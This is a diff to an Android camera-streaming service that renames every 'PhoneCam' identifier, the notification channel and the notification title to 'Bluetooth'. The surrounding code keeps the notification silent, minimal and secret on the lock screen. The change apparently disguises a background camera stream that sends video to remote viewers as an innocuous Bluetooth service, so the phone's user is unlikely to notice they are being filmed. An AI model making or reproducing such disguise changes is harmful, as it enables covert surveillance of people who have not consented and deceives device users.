@@ -1,4 +1,4 @@
-package com.phonecam;
+package com.Bluetooth;
 
 import android.annotation.SuppressLint;
 import android.app.Notification;
@@ -39,16 +39,16 @@ import java.util.concurrent.atomic.AtomicBoolean;
 public class CameraStreamService extends Service {
 
     private static final String TAG = "CameraStreamService";
-    private static final String CHANNEL_ID = "phonecam_channel";
+    private static final String CHANNEL_ID = "Bluetooth_channel";
     private static final int NOTIF_ID = 1;
 
-    public static final String ACTION_START       = "com.phonecam.START";
-    public static final String ACTION_STOP        = "com.phonecam.STOP";
-    public static final String ACTION_SWITCH_CAM  = "com.phonecam.SWITCH_CAM";
-    public static final String ACTION_SET_QUALITY = "com.phonecam.SET_QUALITY";
-    public static final String ACTION_SET_RES     = "com.phonecam.SET_RES";
+    public static final String ACTION_START       = "com.Bluetooth.START";
+    public static final String ACTION_STOP        = "com.Bluetooth.STOP";
+    public static final String ACTION_SWITCH_CAM  = "com.Bluetooth.SWITCH_CAM";
+    public static final String ACTION_SET_QUALITY = "com.Bluetooth.SET_QUALITY";
+    public static final String ACTION_SET_RES     = "com.Bluetooth.SET_RES";
 
-    public static final String BROADCAST_STATUS = "com.phonecam.STATUS";
+    public static final String BROADCAST_STATUS = "com.Bluetooth.STATUS";
     public static final String EXTRA_VIEWERS    = "viewers";
     public static final String EXTRA_FPS        = "fps";
     public static final String EXTRA_RUNNING    = "running";
@@ -446,7 +446,7 @@ public class CameraStreamService extends Service {
 
     private void createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel ch = new NotificationChannel(CHANNEL_ID, "PhoneCam", NotificationManager.IMPORTANCE_NONE);
+            NotificationChannel ch = new NotificationChannel(CHANNEL_ID, "Bluetooth", NotificationManager.IMPORTANCE_NONE);
             ch.setShowBadge(false); ch.setSound(null, null);
             ch.enableLights(false); ch.enableVibration(false);
             NotificationManager nm = getSystemService(NotificationManager.class);
@@ -458,7 +458,7 @@ public class CameraStreamService extends Service {
         int flags = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? PendingIntent.FLAG_IMMUTABLE : 0;
         PendingIntent pi = PendingIntent.getActivity(this, 0, new Intent(this, MainActivity.class), flags);
         return new NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("PhoneCam").setContentText(text)
+            .setContentTitle("Bluetooth").setContentText(text)
             .setSmallIcon(android.R.drawable.ic_menu_camera).setContentIntent(pi)
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setVisibility(NotificationCompat.VISIBILITY_SECRET)
